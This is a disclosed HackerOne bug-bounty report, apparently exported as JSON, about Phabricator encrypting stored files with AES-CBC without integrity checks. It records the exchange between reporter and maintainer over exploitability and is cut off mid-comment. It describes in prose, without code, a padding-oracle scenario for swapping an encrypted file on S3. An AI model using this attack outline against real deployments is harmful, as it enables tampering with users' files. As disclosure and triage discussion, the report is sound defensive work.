{"id":216746,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTY3NDY=","url":"https://hackerone.com/reports/216746","title":"Phabricator is vulnerable to padding oracle attacks and chosen-ciphertext attacks.","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-03-28T17:31:13.989Z","submitted_at":"2017-03-28T17:31:13.989Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"edoverflow","url":"/edoverflow","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":18,"url":"https://hackerone.com/phabricator","handle":"phabricator","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Phabricator","twitter_handle":"phabricator","website":"http://phacility.com/phabricator/","about":"Phabricator is a collection of open source web applications that help software companies build better software."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-04-05T20:16:10.747Z","bug_reporter_agreed_on_going_public_at":"2017-04-05T20:16:10.702Z","team_member_agreed_on_going_public_at":"2017-04-05T19:19:38.248Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Dear Phabricator bug bounty team,\n\n# Summary\n---\n\nPhabricator encrypts data with AES in CBC mode, but does not ensure integrity of the encrypted data. You must authenticate the data, by either using an HMAC or by using an authenticated block cipher mode like GCM.\n\n# Why does this vulnerability exist?\n---\n\n`src/applications/files/format/PhabricatorFileAES256StorageFormat.php` encrypts the data as follows without checking the integrity of the message:\n\n~~~\nprivate function encryptData(\n    $data,\n    PhutilOpaqueEnvelope $key,\n    PhutilOpaqueEnvelope $iv) {\n    $method = 'aes-256-cbc';\n    $key = $key-\u003eopenEnvelope();\n    $iv = $iv-\u003eopenEnvelope();\n    $result = openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv);\n    if ($result === false) {\n      throw new Exception(\n        pht(\n          'Failed to openssl_encrypt() data: %s',\n          openssl_error_string()));\n    }\n    return $result;\n}\n~~~\n\nLink to source code: https://github.com/phacility/phabricator/blob/master/src/applications/files/format/PhabricatorFileAES256StorageFormat.php\n\n# How can this be exploited?\n---\n\nBy not ensuring integrity Phabricator is vulnerable to padding oracle attacks and chosen-ciphertext attacks.\n\n# How can this be fixed?\n---\n\nAs stated previously, you must check the integrity of the data, by either using an HMAC or by using an authenticated block cipher mode like GCM.\n\nBest regards,\nEd","vulnerability_information_html":"\u003cp\u003eDear Phabricator bug bounty team,\u003c/p\u003e\n\n\u003ch1 id=\"summary\"\u003eSummary\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003ePhabricator encrypts data with AES in CBC mode, but does not ensure integrity of the encrypted data. You must authenticate the data, by either using an HMAC or by using an authenticated block cipher mode like GCM.\u003c/p\u003e\n\n\u003ch1 id=\"why-does-this-vulnerability-exist\"\u003eWhy does this vulnerability exist?\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003e\u003ccode\u003esrc/applications/files/format/PhabricatorFileAES256StorageFormat.php\u003c/code\u003e encrypts the data as follows without checking the integrity of the message:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eprivate function encryptData(\n    $data,\n    PhutilOpaqueEnvelope $key,\n    PhutilOpaqueEnvelope $iv) {\n    $method = \u0026#39;aes-256-cbc\u0026#39;;\n    $key = $key-\u0026gt;openEnvelope();\n    $iv = $iv-\u0026gt;openEnvelope();\n    $result = openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv);\n    if ($result === false) {\n      throw new Exception(\n        pht(\n          \u0026#39;Failed to openssl_encrypt() data: %s\u0026#39;,\n          openssl_error_string()));\n    }\n    return $result;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLink to source code: \u003ca title=\"https://github.com/phacility/phabricator/blob/master/src/applications/files/format/PhabricatorFileAES256StorageFormat.php\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fphacility%2Fphabricator%2Fblob%2Fmaster%2Fsrc%2Fapplications%2Ffiles%2Fformat%2FPhabricatorFileAES256StorageFormat.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/phacility/phabricator/blob/master/src/applications/files/format/PhabricatorFileAES256StorageFormat.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"how-can-this-be-exploited\"\u003eHow can this be exploited?\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eBy not ensuring integrity Phabricator is vulnerable to padding oracle attacks and chosen-ciphertext attacks.\u003c/p\u003e\n\n\u003ch1 id=\"how-can-this-be-fixed\"\u003eHow can this be fixed?\u003c/h1\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eAs stated previously, you must check the integrity of the data, by either using an HMAC or by using an authenticated block cipher mode like GCM.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nEd\u003c/p\u003e\n","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":39,"name":"Missing Required Cryptographic Step"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-05-05T19:19:38.300Z","allow_singular_disclosure_after":-115205947.8812412,"singular_disclosure_allowed":true,"vote_count":21,"voters":["tomdev","sp1d3rs","kapytein","michiel","adn","ramsexy","spam404","glc","apox","muhammad_uwais","and 11 more..."],"severity":{"rating":"medium","score":5.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1568453,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just to make it clear that I have read your HackerOne policy, here is your keyword: `mongoose`.","markdown_message":"\u003cp\u003eJust to make it clear that I have read your HackerOne policy, here is your keyword: \u003ccode\u003emongoose\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-28T17:46:45.339Z","updated_at":"2017-03-28T17:46:45.339Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1568541,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"What steps would an attacker take to exploit this vulnerability?","markdown_message":"\u003cp\u003eWhat steps would an attacker take to exploit this vulnerability?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-28T18:21:06.356Z","updated_at":"2017-03-28T18:21:06.356Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1568686,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the prompt response! Unauthenticated encryption exposes the user to numerous vulnerabilities meaning their are various ways to exploit this issue. For instance, if an attacker could modify the file (possibly via bit flipping), the application should respond with an error warning the user that the file has been modified. In this case, since the application does not use a MAC tag, there is no warning.","markdown_message":"\u003cp\u003eThanks for the prompt response! Unauthenticated encryption exposes the user to numerous vulnerabilities meaning their are various ways to exploit this issue. For instance, if an attacker could modify the file (possibly via bit flipping), the application should respond with an error warning the user that the file has been modified. In this case, since the application does not use a MAC tag, there is no warning.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-28T19:32:54.329Z","updated_at":"2017-03-28T19:32:54.329Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1568697,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"What is a set of steps an attacker could take to modify the file (without also being able to modify the checksum)?","markdown_message":"\u003cp\u003eWhat is a set of steps an attacker could take to modify the file (without also being able to modify the checksum)?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-28T19:37:33.662Z","updated_at":"2017-03-28T19:37:33.662Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1568704,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"In that case, the attacker would probably launch a chosen ciphertext attack by using Phabricator as a decryption oracle.","markdown_message":"\u003cp\u003eIn that case, the attacker would probably launch a chosen ciphertext attack by using Phabricator as a decryption oracle.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-28T19:42:10.700Z","updated_at":"2017-03-28T19:42:10.700Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1568710,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm trying to determine whether you are actually describing an attack or just copy/pasting from a best practices document with no actual insight.\n\nPlease give me a specific, plausible series of steps that an attacker can take to exploit the vulnerability you believe you are reporting in Phabricator.","markdown_message":"\u003cp\u003eI\u0026#39;m trying to determine whether you are actually describing an attack or just copy/pasting from a best practices document with no actual insight.\u003c/p\u003e\n\n\u003cp\u003ePlease give me a specific, plausible series of steps that an attacker can take to exploit the vulnerability you believe you are reporting in Phabricator.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-28T19:45:23.997Z","updated_at":"2017-03-28T19:45:23.997Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1568763,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e I'm trying to determine whether you are actually describing an attack or just copy/pasting from a best practices document with no actual insight.\n\nI am terribly sorry if it comes over as that. I participate in a lot of different projects that implement crypto so I quickly assumed that you knew what all these vulnerabilities are and that you knew that unauthenticated encryption is bad.\n\n\u003e Please give me a specific, plausible series of steps that an attacker can take to exploit the vulnerability you believe you are reporting in Phabricator.\n\n1) The Phabricator user encrypts a file with Phabricator and simply assumes that the encrypted file is now secure. Now let's assume the user stores the file on a cloud storage service (Dropbox, Google Drive etc.) and that the communication to the cloud storage service is not secure. \n2) The attacker intercepts the file. \n3) The attacker encrypts a malicious payload and replaces the ciphertext with the ecrypted payload. When the user decrypts the file, the code executes since there is no authentication.\n\nThis is one of many different plausible scenarios that I can come up with. Please let me know if you need more information.","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eI\u0026#39;m trying to determine whether you are actually describing an attack or just copy/pasting from a best practices document with no actual insight.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI am terribly sorry if it comes over as that. I participate in a lot of different projects that implement crypto so I quickly assumed that you knew what all these vulnerabilities are and that you knew that unauthenticated encryption is bad.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003ePlease give me a specific, plausible series of steps that an attacker can take to exploit the vulnerability you believe you are reporting in Phabricator.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e1) The Phabricator user encrypts a file with Phabricator and simply assumes that the encrypted file is now secure. Now let\u0026#39;s assume the user stores the file on a cloud storage service (Dropbox, Google Drive etc.) and that the communication to the cloud storage service is not secure. \u003cbr\u003e\n2) The attacker intercepts the file. \u003cbr\u003e\n3) The attacker encrypts a malicious payload and replaces the ciphertext with the ecrypted payload. When the user decrypts the file, the code executes since there is no authentication.\u003c/p\u003e\n\n\u003cp\u003eThis is one of many different plausible scenarios that I can come up with. Please let me know if you need more information.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-28T20:07:39.503Z","updated_at":"2017-03-28T20:07:39.503Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1568889,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It really doesn't sound like you're reporting a specific vulnerability in Phabricator with a plausible path to exploitation.\n\nHow would the unwitting victim retrieve the ciphertext in order to store it in Dropbox?","markdown_message":"\u003cp\u003eIt really doesn\u0026#39;t sound like you\u0026#39;re reporting a specific vulnerability in Phabricator with a plausible path to exploitation.\u003c/p\u003e\n\n\u003cp\u003eHow would the unwitting victim retrieve the ciphertext in order to store it in Dropbox?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-28T20:45:43.441Z","updated_at":"2017-03-28T20:45:43.441Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1569564,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I believe I know what the issue is now. I completely misunderstood what the purpose of encryption is here. For some reason I assumed that someone setting up Phabricator (the user in my case) would be able to define where the ciphertext is stored: https://secure.phabricator.com/book/phabricator/article/configuring_file_storage/.\n\nNow I understand why you thought I was just regurgitating a best practice. Nevertheless, I want to make sure that there really isn't a vulnerability here. So I have a couple questions for you:\n\n1) Could you please explain what this code is for or could you point me in the right direction?\n2) What do you use encryption for? What are you protecting against?\n\nThank you for your patience.","markdown_message":"\u003cp\u003eI believe I know what the issue is now. I completely misunderstood what the purpose of encryption is here. For some reason I assumed that someone setting up Phabricator (the user in my case) would be able to define where the ciphertext is stored: \u003ca title=\"https://secure.phabricator.com/book/phabricator/article/configuring_file_storage/\" href=\"/redirect?url=https%3A%2F%2Fsecure.phabricator.com%2Fbook%2Fphabricator%2Farticle%2Fconfiguring_file_storage%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.phabricator.com/book/phabricator/article/configuring_file_storage/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eNow I understand why you thought I was just regurgitating a best practice. Nevertheless, I want to make sure that there really isn\u0026#39;t a vulnerability here. So I have a couple questions for you:\u003c/p\u003e\n\n\u003cp\u003e1) Could you please explain what this code is for or could you point me in the right direction?\u003cbr\u003e\n2) What do you use encryption for? What are you protecting against?\u003c/p\u003e\n\n\u003cp\u003eThank you for your patience.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-29T06:23:23.095Z","updated_at":"2017-03-29T06:23:23.095Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1569606,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"In some cases, installs have their own application servers in a high-trust datacenter, but want to use S3 as a file storage engine for whatever reason (for example, because they don't want the operational overhead of swapping disks or allocating storage or dealing with huge backups).\n\nStoring file blobs encrypted in S3 protects these installs against attacks by AWS employees or attackers who can mount an attack on an AWS datacenter directly (in an extreme case, state actors storming an AWS facility and taking hardware by force). This encryption reduces the amount of trust which needs to be placed in S3/AWS.\n\nIn other cases, installs don't actually care about security or any specific attack, but have a policy which requires or encourages data to be stored encrypted. In these cases, the feature need not provide any actual security benefit, just satisfy the letter of the policy. Installs which have expressed interest in encryption from this angle have generally not actually cared that the encryption is provable, secure, observable, or even that it protects against any specific attack scenario: they're just following a policy that says encryption is good.\n\nWe have not implemented the feature to address these cases, although we've probably seen more of these cases than \"S3 vs Trusted Datacenter\" cases. Particularly, we specifically avoided implementing the unprovable \"encrypt data\" S3 checkbox that AWS offers (you can find some discussion in \u003chttps://secure.phabricator.com/D10176\u003e) in favor of a scheme which at least protects against some set of attackers, however implausible it may be that Chinese commandos are going to storm an AWS datacenter.\n\nI think there may be a legitimate -- if somewhat far-fetched -- attack here:\n\n  - Compromise the file storage engine (e.g., S3) and gain read and write access.\n  - Compromise a Phabricator user account.\n  - You can only use Phabricator as a padding oracle for files your user account can read, so identify some readable file which you can trick a more privileged user into executing (`trustworthy.exe`).\n  - Conduct a padding oracle attack by writing blocks into S3 and reading from the web UI. You can read the file, so you have the plaintext, and you control S3 so you have the cipher text, and can rewrite the cipher text. You do not control an application server so you do not have the IV or encryption key. Note that each 4MB block of each file uses a unique key and IV, so I believe you can't do any kind of sideways attack where you use your permission on some files to compromise other files. Nor can you directly attack the master encryption key on the keyring.\n  - Your goal is to use the padding oracle to discover the correct ciphertext for an alternate binary (`evil.exe`) so you can replace the ciphertext on disk. I'm unsure if this is actually possible. If it is, I'm unsure if it's practical. For example, you must make a web request for each query to the oracle, and that request must make a service call to S3 and load the blob, so even a relatively low-complexity attack might be stretched to an unrealistically long timeframe.\n  - Once you've discovered the ciphertext for `evil.exe`, you replace it on disk in S3 and then wait for your victim to download and execute the file from Phabricator (or encourage them to do so).\n\nThis requires you to compromise S3 and a user account, but be unable to compromise an application host (if you could, you could just read the encryption key). State attackers raiding datacenters probably don't have time to conduct this attack and would have to separately compromise an account.\n\nAn employee might more reasonably have an account and be able to gain AWS credentials to access S3. These credentials should normally be stored alongside the keyring and subject to the same security protocols, but realistically installs probably use AWS for more things than Phabricator and may not set up single-use credentials for it. In most cases this probably boils down to a social engineering attack where the major compromise is convincing a privileged coworker to run a binary. Perhaps this oracle-based approach could tip the balance and let this attack succeed where it would otherwise fail, but I don't think routine workflows normally lead users to regularly execute binaries from Phabricator or place any particular trust in them.\n\nWhether this attack is actually possible or not, I think checksumming blobs is probably worth implementing anyway. It may not really defuse any attack here, but there's some value in just having an integrity checksum and it's not particularly difficult to implement. But I'd like better evidence that this attack represents a real threat rather than a purely theoretical one before prioritizing this as a security issue.\n\nThere are some other bugs in adjacent areas of the code (notably \u003chttps://secure.phabricator.com/T12079\u003e) and we make some use of SHA1, which we should move away from now that a collision has been found, but my current thinking is that none of this is sufficiently alarming to prioritize as a security concern and that we can just fix it all the next time we're working in that area of the product.\n\nGiven this:\n\n  - Can you construct a more concerning attack?\n  - Do you think the attack I describe above is actually more concerning than I'm assessing it to be?","markdown_message":"\u003cp\u003eIn some cases, installs have their own application servers in a high-trust datacenter, but want to use S3 as a file storage engine for whatever reason (for example, because they don\u0026#39;t want the operational overhead of swapping disks or allocating storage or dealing with huge backups).\u003c/p\u003e\n\n\u003cp\u003eStoring file blobs encrypted in S3 protects these installs against attacks by AWS employees or attackers who can mount an attack on an AWS datacenter directly (in an extreme case, state actors storming an AWS facility and taking hardware by force). This encryption reduces the amount of trust which needs to be placed in S3/AWS.\u003c/p\u003e\n\n\u003cp\u003eIn other cases, installs don\u0026#39;t actually care about security or any specific attack, but have a policy which requires or encourages data to be stored encrypted. In these cases, the feature need not provide any actual security benefit, just satisfy the letter of the policy. Installs which have expressed interest in encryption from this angle have generally not actually cared that the encryption is provable, secure, observable, or even that it protects against any specific attack scenario: they\u0026#39;re just following a policy that says encryption is good.\u003c/p\u003e\n\n\u003cp\u003eWe have not implemented the feature to address these cases, although we\u0026#39;ve probably seen more of these cases than \u0026quot;S3 vs Trusted Datacenter\u0026quot; cases. Particularly, we specifically avoided implementing the unprovable \u0026quot;encrypt data\u0026quot; S3 checkbox that AWS offers (you can find some discussion in \u003ca title=\"https://secure.phabricator.com/D10176\" href=\"/redirect?url=https%3A%2F%2Fsecure.phabricator.com%2FD10176\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.phabricator.com/D10176\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) in favor of a scheme which at least protects against some set of attackers, however implausible it may be that Chinese commandos are going to storm an AWS datacenter.\u003c/p\u003e\n\n\u003cp\u003eI think there may be a legitimate -- if somewhat far-fetched -- attack here:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eCompromise the file storage engine (e.g., S3) and gain read and write access.\u003c/li\u003e\n\u003cli\u003eCompromise a Phabricator user account.\u003c/li\u003e\n\u003cli\u003eYou can only use Phabricator as a padding oracle for files your user account can read, so identify some readable file which you can trick a more privileged user into executing (\u003ccode\u003etrustworthy.exe\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eConduct a padding oracle attack by writing blocks into S3 and reading from the web UI. You can read the file, so you have the plaintext, and you control S3 so you have the cipher text, and can rewrite the cipher text. You do not control an application server so you do not have the IV or encryption key. Note that each 4MB block of each file uses a unique key and IV, so I believe you can\u0026#39;t do any kind of sideways attack where you use your permission on some files to compromise other files. Nor can you directly attack the master encryption key on the keyring.\u003c/li\u003e\n\u003cli\u003eYour goal is to use the padding oracle to discover the correct ciphertext for an alternate binary (\u003ccode\u003eevil.exe\u003c/code\u003e) so you can replace the ciphertext on disk. I\u0026#39;m unsure if this is actually possible. If it is, I\u0026#39;m unsure if it\u0026#39;s practical. For example, you must make a web request for each query to the oracle, and that request must make a service call to S3 and load the blob, so even a relatively low-complexity attack might be stretched to an unrealistically long timeframe.\u003c/li\u003e\n\u003cli\u003eOnce you\u0026#39;ve discovered the ciphertext for \u003ccode\u003eevil.exe\u003c/code\u003e, you replace it on disk in S3 and then wait for your victim to download and execute the file from Phabricator (or encourage them to do so).\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThis requires you to compromise S3 and a user account, but be unable to compromise an application host (if you could, you could just read the encryption key). State attackers raiding datacenters probably don\u0026#39;t have time to conduct this attack and would have to separately compromise an account.\u003c/p\u003e\n\n\u003cp\u003eAn employee might more reasonably have an account and be able to gain AWS credentials to access S3. These credentials should normally be stored alongside the keyring and subject to the same security protocols, but realistically installs probably use AWS for more things than Phabricator and may not set up single-use credentials for it. In most cases this probably boils down to a social engineering attack where the major compromise is convincing a privileged coworker to run a binary. Perhaps this oracle-based approach could tip the balance and let this attack succeed where it would otherwise fail, but I don\u0026#39;t think routine workflows normally lead users to regularly execute binaries from Phabricator or place any particular trust in them.\u003c/p\u003e\n\n\u003cp\u003eWhether this attack is actually possible or not, I think checksumming blobs is probably worth implementing anyway. It may not really defuse any attack here, but there\u0026#39;s some value in just having an integrity checksum and it\u0026#39;s not particularly difficult to implement. But I\u0026#39;d like better evidence that this attack represents a real threat rather than a purely theoretical one before prioritizing this as a security issue.\u003c/p\u003e\n\n\u003cp\u003eThere are some other bugs in adjacent areas of the code (notably \u003ca title=\"https://secure.phabricator.com/T12079\" href=\"/redirect?url=https%3A%2F%2Fsecure.phabricator.com%2FT12079\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.phabricator.com/T12079\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) and we make some use of SHA1, which we should move away from now that a collision has been found, but my current thinking is that none of this is sufficiently alarming to prioritize as a security concern and that we can just fix it all the next time we\u0026#39;re working in that area of the product.\u003c/p\u003e\n\n\u003cp\u003eGiven this:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eCan you construct a more concerning attack?\u003c/li\u003e\n\u003cli\u003eDo you think the attack I describe above is actually more concerning than I\u0026#39;m assessing it to be?\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2017-03-29T07:11:59.800Z","updated_at":"2017-03-29T07:11:59.800Z","actor":{"username":"epriestley","cleared":false,"url":"/epriestley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/043/3ebca5250ea5abd54b49ccc9d69c636af4585b2e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"phabricator","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1570975,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"**That is hands down the best response I have ever had from a bug bounty report. Thank you for taking the time to explain everything thoroughly.** I will brake my response down and address individual parts of your response.\n\n\u003e Storing file blobs encrypted in S3 protects these installs against attacks by AWS employees or attackers who can mount an attack on an AWS datacenter directly (in an extreme case, state actors storming an AWS facility and taking hardware by force). This encryption reduces the amount of trust which needs to be placed in S3/AWS.\n\nOK, so while very unlikely, a rogue AWS employee could potentially exploit this vulnerability without having to have access to the victim's Phabricator account.\n\n\u003e In other cases, installs don't actually care about security or any specific attack, but have a policy which requires or encourages data to be stored encrypted. In these cases, the feature need not provide any actual security benefit, just satisfy the letter of the policy. Installs which have expressed interest in encryption from this angle have generally not actually cared that the encryption is provable, secure, observable, or even that it protects against any specific attack scenario: they're just following a policy that says encryption is good.\n\nThis raises a new issue for me. Although Phabricator is not directly to blame here, no encryption is almost better than \"bad\" encryption, since this could potentially give another user (keep in mind I am using the term user to define somebody setting up their own installation of Phabricator) a false sense of security. I will come back to this later on. [1]\n\n\u003e We have not implemented the feature to address these cases, although we've probably seen more of these cases than \"S3 vs Trusted Datacenter\" cases. Particularly, we specifically avoided implementing the unprovable \"encrypt data\" S3 checkbox that AWS offers (you can find some discussion in https://secure.phabricator.com/D10176) in favor of a scheme which at least protects against some set of attackers, however implausible it may be that Chinese commandos are going to storm an AWS datacenter.\n\nFair enough.\n\n\u003e I think there may be a legitimate -- if somewhat far-fetched -- attack here: [...]\n\nI will come back to this when reevaluating the severity of the issue. [2]\n\n\u003e An employee might more reasonably have an account and be able to gain AWS credentials to access S3. These credentials should normally be stored alongside the keyring and subject to the same security protocols, but realistically installs probably use AWS for more things than Phabricator and may not set up single-use credentials for it. In most cases this probably boils down to a social engineering attack where the major compromise is convincing a privileged coworker to run a binary. Perhaps this oracle-based approach could tip the balance and let this attack succeed where it would otherwise fail, but I don't think routine workflows normally lead users to regularly execute binaries from Phabricator or place any particular trust in them.\n\nSo this is where I go back to [1]. If I understood correctly you only mention social engineering an AWS employee, but I believe the false sense of security could mean that the attacker may have an easier time trying to trick the user.\n\n\u003e Whether this attack is actually possible or not, I think checksumming blobs is probably worth implementing anyway. It may not really defuse any attack here, but there's some value in just having an integrity checksum and it's not particularly difficult to implement.\n\nThis is a very good idea, but at the same time you should add an authentication mechanism. Some users may ignore checksum mismatches and completely rely on the decryption process ensuring integrity.\n\n\u003e But I'd like better evidence that this attack represents a real threat rather than a purely theoretical one before prioritizing this as a security issue.\n\nFinally, I am still confident that this issues could be exploited in combination with other issues, such as the false sense of security. Therefore, to help you prioritise this security issue we should use the following CVSS score: `CVSS:3.0/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:N` -\u003e 